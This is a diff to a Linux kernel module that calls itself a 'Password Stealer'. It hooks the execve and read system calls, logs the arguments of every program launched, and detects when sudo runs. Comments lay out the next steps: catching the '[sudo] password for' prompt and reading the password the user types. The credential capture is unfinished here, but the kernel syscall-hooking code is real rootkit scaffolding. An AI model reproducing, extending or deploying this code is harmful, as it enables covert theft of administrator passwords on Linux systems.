@@ -14,6 +14,9 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("SourceCodeDeleted");
+
+// Special thanks to sticksxo
+
 MODULE_DESCRIPTION("Simple Hooking Password Stealer Syscall");
 MODULE_VERSION("1.0");
 
@@ -33,6 +36,7 @@ void DisablePageWriting(void){
 // EXECVE STRACE
 
 /*
+
 # sudo  strace -u myusername  sudo -k pwd
 execve("/bin/ls", ["ls", "-l"], 0x7ffc804d9e98 ) = 0
 execve("/usr/bin/sudo", ["sudo", "-k", "pwd"], 0x7ffdff5fec50  24 vars ) = 0
@@ -86,80 +90,7 @@ copy_to_user	Copies a block of data from the kernel to user space
 copy_from_user	Copies a block of data from user space to the kernel
 strnlen_user	Gets the size of a string buffer in user space
 strncpy_from_user	Copies a string from user space into the kernel
-
-
-
-
-
-
 */
-
-
-
-struct user_arg_ptr {
-#ifdef CONFIG_COMPAT
-	bool is_compat;
-#endif
-	union {
-		const char __user *const __user *native;
-#ifdef CONFIG_COMPAT
-		const compat_uptr_t __user *compat;
-#endif
-	} ptr;
-};
-
-
-
-
-
-static const char __user *get_user_arg_ptr(struct user_arg_ptr argv, int nr)
-{
-	const char __user *native;
-
-	if (get_user(native, argv.ptr.native + nr))
-		return ERR_PTR(-EFAULT);
-
-	return native;
-}
-
-
-
-static int count(struct user_arg_ptr argv, int max)
-{
-	int i = 0;
-
-	if (argv.ptr.native != NULL) {
-		for (;;) {
-			const char __user *p = get_user_arg_ptr(argv, i);
-
-			if (!p)
-				break;
-
-			if (IS_ERR(p))
-				return -EFAULT;
-
-			if (i >= max)
-				return -E2BIG;
-			++i;
-
-			if (fatal_signal_pending(current))
-				return -ERESTARTNOHAND;
-			cond_resched();
-		}
-	}
-	return i;
-}
-
-
-
-
-
-
-
-
-
-
-
 
 
 char char_buffer[255] = {0};
@@ -181,92 +112,33 @@ char Argz       [255] = {'\0'};;
 asmlinkage int (*origional_execve)(const char *filename, char *const argv[], char *const envp[]);
 asmlinkage int HookExecve(const char *filename, char *const argv[], char *const envp[]) {
 
- 	   unsigned int len     = sizeof(CharBuffer) / sizeof(CharBuffer[0]);
-       unsigned int Argzlen = sizeof(Argz)       / sizeof(Argz[0]);
+      copy_from_user(&CharBuffer , filename , strnlen_user(filename , sizeof(CharBuffer) - 1  ) );
+      printk( KERN_INFO "Executable Name %s  \n", CharBuffer );
 
-        copy_from_user(&CharBuffer , filename , strnlen_user(filename , sizeof(CharBuffer) - 1  ) );
-        printk( KERN_INFO "Executable Name %s  \n", CharBuffer );
-     
-             char foo = "zzz";
-            //get_user(foo , *&argv+1);
-            int Length  = strnlen_user(*argv , 3);
-            printk (KERN_INFO "Access OK ! %d", Length);
-            // copy_from_user(&CharBuffer , argv , 8   );
-            
-			strncpy_from_user(Argz, *argv , 4);
+			char * ptr = 0xF00D; 
 
-            //str = get_user_arg_ptr(argv, i);
-            //len = strnlen_user(str, MAX_ARG_STRLEN);
+      // Since we don't know the count of args we go until the 0 arg.
+      // We will collect 20 args maximum. 
+      // 
 
+		for (int i = 0 ; i < 20 ; i++){ 
+        if(ptr){
+         int success =  copy_from_user(&ptr, &argv[i], sizeof(ptr));
+         // Check for ptr being 0x00 
+         if(success == 0 && ptr){
+            //printk( KERN_INFO "Pointer Name %px  \n", ptr );
+            strncpy_from_user(Argz, ptr , sizeof(Argz));
+            printk( KERN_INFO "Args  %s  \n", Argz );
+            memset(Argz, 0 ,sizeof(Argz));
 
+         }
+    }
+}
+        // We need to check if SUDO is called.
+        if(   strcmp(CharBuffer , "/usr/bin/sudo" ) == 0   ){
+            printk( KERN_INFO "Sudo Executed! ");
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        // if( access_ok(VERIFY_READ ,argv, strnlen_user(&argv , 12) ) == true ){
-
-        //   printk (KERN_INFO "Access OK ! ");
-        // }
-
-        //int Length  = strnlen_user(argv[1] , MAX_ARG_STRLEN);
-
-        //strncpy_from_user(Argz, argv[0]);
-    
-
-        //str = get_user_arg_ptr(argv, argc);
-        //int Length  = strnlen_user(argv[0] , 3);
-
-        //copy_from_user(argz[0], argv[0], strnlen_user(argv[0] , MAX_ARG_STRLEN ));
-
-	
-	// size_t i = 0;
-    // for (i = 0; argv[i] != 0; ++i) {
-
-    //      // note: argz has type `char (*)[255][255]`
-    //      // so: sizeof(argz) = 255 * 255 * sizeof(char)
-    //      // *argz has type `char (*)[255]`
-    //      // so: sizeof(*argz) = 255 * 255 * sizeof(char)
-    //      // so: sizeof(argz)/sizeof(*argz) = 255
-    //      // This would NOT work if `argz` would be a `char**`...
-    //      // if (i > sizeof(argz)/sizeof(*argz)) {
-    //      // but there is ARRAY_SIZE macro that does the same
-
-    //  //// Removed
-    //  //     if (i > ARRAY_SIZE(argz)) {
-    //  //          // TODO: not enough indexes
-    //  //          return (*origional_execve)(filename, argv, envp);
-    //  //     }
-
-    //      // sizeof(argz[i]) = sizeof(char(*)[255]) = 
-    //      //                 = 255 * sizeof(char) = 255
-    //      //
-
-    //  //// Section Removed
-    //  //     if (strnlen_user(argv[i], (MAX_ARG_STRLEN - 1)  ) + 1 > sizeof(argz[i]) ) {
-    //  //          // TODO: no memory to copy
-    //  //          return (*origional_execve)(filename, argv, envp);
-    //  //     }
-    //      copy_from_user(argz[i], argv[i], strnlen_user(argv[i] , (MAX_ARG_STRLEN - 1) ) + 1);
-    // }
-    // argc = i;
-
-    // printk( KERN_INFO "Executable Name %s \n", char_buffer);
-//     for (size_t i = 0; i < argc; ++i) {
-//         printk( KERN_INFO "arg[i] = %s\n", argz[i]);            
-//     }
+        }
 
 
 
@@ -278,11 +150,18 @@ asmlinkage int HookExecve(const char *filename, char *const argv[], char *const 
 
 
 
+//TODO   ssize_t write(int fd, const void *buf, size_t count);
+// TODO  check if write syscall containes the following:
+// TODO  "[sudo] password for"
+
+
 
 
 asmlinkage int (*original_read)(unsigned int, void __user*, size_t);
 asmlinkage int  HookRead(unsigned int fd, void __user* buf, size_t count) {
 	//printk(KERN_INFO "READ HOOKED HERE! -- This is our function!");
+
+  //TODO Read if buffer one byte until byte == \n
 
 	return (*original_read)(fd, buf, count);
 }
